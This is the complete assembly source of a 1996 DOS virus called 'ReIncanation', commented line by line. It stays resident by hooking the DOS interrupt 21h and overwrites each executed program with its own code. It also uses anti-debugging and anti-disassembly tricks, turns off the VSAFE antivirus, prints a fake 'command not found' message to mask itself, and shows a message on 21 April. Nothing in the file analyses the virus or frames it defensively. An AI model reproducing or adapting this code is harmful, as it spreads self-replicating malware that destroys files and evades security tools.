start:
and al,21h

                               ;anti_disassembler & anti_debugger
mov cx,09ebh
mov ax,0fe05h
jmp $-2
add ah,03bh
jmp $-10

                                ;anti_debugger
mov ax,3503h                    ;save int 3h in bx
int 21h                         ;do it
mov ah,25h                      ;set new int 3h...
mov dx,offset new_int_3         ;...to new_int_3
int 21h                         ;do it
xchg bx,dx                      ;exchange bx,dx (restore original int 3h)
int 21h                         ;do it


                                ;anti_vsafe
mov ax,0f9f2h
add ax,10h
mov dx,5935h
add dx,10h
mov bl,10h
sub bl,10h
int 16h


mov ah,9h                       ;write string
mov dx,offset file_not_found    ;Befehl oder Dateiname nicht gefunden.
int 21h                         ;do it


mov ax,9999h                    ;put 9999h in ax (for resident test)
int 21h                         ;do it

cmp bx,9999h                    ;compare bx,9999h
je already_there                ;if bx=9999h, we are already resident and goto already_there
jmp makemegotsr                 ;else goto makemegotsr

already_there:                  ;already resident
int 20h                         ;exit


makemegotsr:
         mov    ax,3521h        ; get int 21h
         int    21h             ;do it
         mov    word ptr cs:old21,bx    ; save old int 21h
         mov    word ptr cs:old21+2,es  ;... save
         mov    dx,offset new21         ; new int 21 comes to offset new21
         mov    ax,2521h                ; set new int 21h
         int    21h                     ; do it
         push   cs                      ; push it
         pop    ds                      ; pop it
         mov    dx,offset endvir        ; put everything of us in memory
         int    27h                     ; do it
        

new21:   pushf                          ;new int 21
         cmp ax,9999h                   ;resident test ???
         jnz no_installation_check      ;if no test goto no_install_check
         xchg ax,bx                     ;if resident test, put 9999h in bx
no_installation_check:                  ;no_install_check
         cmp    ax,4b00h                ;is there something executed?
         jz     infect                  ;yes, goto infect
         jmp    short end21             ;no, jmp to normal old int 21h

infect:                                 ;infect the executed file
         mov    ax,4301h                ;set attributes
         xor cx,cx                      ;to 0
         int    21h                     ;do it

         mov    ax,3d02h                ;open file
         int    21h                     ;do it
         mov    bx,ax                   ;put ax in bx, or.. xchg ax,bx.. but that doesn't work here
         push   ax                      ;push all
         push   bx
         push   cx
         push   dx
         push   ds

         push   cs
         pop    ds
         mov    ax,4200h                ;seek
         xor    cx,cx                   ;at beginning of tha file
         cwd
         int    21h                     ;do it

         mov    cx,offset endvir-offset start   ;how much bytes to write
         mov    ah,40h                          ;write
         mov    dx,offset start                 ;from offset start
         int    21h                             ;do it

         cwd                                    ; set date/time
         xor    cx,cx                           ; to zero
         mov    ax,5701h                        ;function for date/time
         int    21h                             ;do it

         mov    ah,3eh                          ; close file
         int    21h                             ;do it

         mov ah,2ah                             ;get date
         int 21h                                ;do it
         cmp dh,4                               ;compare month(dh) with 4
         jne not_my_birthday                    ;not the 4th month, goto not_my_birthday
monat_ok:cmp dl,21                              ;else compare day(dl) with 21
         jne not_my_birthday                    ;not the 21th, goto not_my_birthday
tag_ok:mov ah,9h                                ;if it is the 21.April write message
        mov dx,offset text                      ;of offset text
        int 21h                                 ;do it
        mov ah,00h                              ;wait until keypressed
        int 16h                                 ;do it
jmp restore                                     ;goto restore (tha registers)

not_my_birthday:                                ;if it is not_my_birthday
mov ah,9h                                       ;write message
mov dx,offset file_not_found                    ;Befehl oder Dateiname nicht gefunden. (English: Bad command or filename.)
int 21h                                         ;do it


restore:
         pop    ds ; pop all
         pop    dx
         pop    cx
         pop    bx
         pop    ax

end21:   popf                           ; pop far
         db     0eah                    ; jmp far (?)

old21    dw     0,0                     ; where to store the old INT21
text: db'ReIncanation written by Spooky. Austria 1996',0dh,0ah,'$'      ;message for debugger or date 21.April
file_not_found: db'Befehl oder Dateiname nicht gefunden.',0dh,0ah,'$'   ;message file not found
new_int_3:                      ;new interrupt 3h for the debugger
mov ah,9h                       ;write string to standard output
mov dx,offset text              ;text to write
int 21h                         ;do it
mov ah,00h                      ;wait until keypressed
int 16h                         ;do it
int 20h                         ;-> terminate debugging


endvir   label  byte ; End of file

end    start
